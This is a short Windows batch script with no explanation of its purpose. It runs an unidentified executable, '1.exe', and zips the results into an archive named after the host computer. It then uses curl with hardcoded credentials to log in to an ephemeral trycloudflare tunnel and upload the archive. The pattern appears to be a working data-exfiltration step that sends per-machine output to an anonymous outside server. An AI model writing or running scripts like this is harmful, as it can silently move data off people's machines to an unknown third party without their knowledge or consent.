@echo off
cd /d "%~dp0"
"1.exe" g.txt 2>&1
move log.txt results\log.txt
powershell -Command "Compress-Archive -Path 'results' -DestinationPath 'result_%COMPUTERNAME%.zip' -Force"
curl -c cookies.txt -d "name=alex" -d "pass=123" https://longer-developing-forget-cons.trycloudflare.com/Login/login.php
curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" https://longer-developing-forget-cons.trycloudflare.com/Login/upload.php
